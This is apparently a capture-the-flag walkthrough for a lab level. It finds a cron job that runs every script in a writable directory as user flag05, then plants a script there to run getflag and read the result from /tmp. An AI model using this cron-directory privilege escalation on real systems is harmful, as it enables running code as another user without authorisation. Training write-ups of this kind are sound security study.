## When logging with the account level05 it say that we have a new mail

cat /var/mail/level05 

> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

cat /usr/sbin/openarenaserver

> #!/bin/sh
>
> for i in /opt/openarenaserver/* ; do
> 	(ulimit -t 5; bash -x "$i")
> 	rm -f "$i"
> done

echo "getflag > /tmp/oui" > /opt/openarenaserver/script.sh
sleep 30
cat /tmp/oui
